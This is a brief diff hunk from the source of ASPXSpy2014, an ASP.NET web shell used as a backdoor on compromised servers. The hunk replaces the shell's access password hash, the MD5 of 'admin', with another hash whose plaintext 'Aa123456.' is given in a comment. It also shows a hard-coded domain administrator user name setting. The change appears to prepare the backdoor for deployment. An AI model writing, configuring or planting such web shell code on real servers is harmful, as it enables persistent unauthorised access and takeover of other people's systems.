@@ -34,7 +34,7 @@
 	Bug or idea: zcgonvh@rootkit.net.cn
 	*/
 	public const string Version="ASPXSpy2014";
-	public const string Password="21232f297a57a5a743894a0e4a801fc3";	//admin
+	public const string Password="4e71002969fcd46813b869e931aedf4b";	//Aa123456.
 	private const string DomainUserName="administrator";//change it if domain user name not equals "administrator"
 	private const string PMCacheName=Version+"PMList";
 	private int CssC=1;
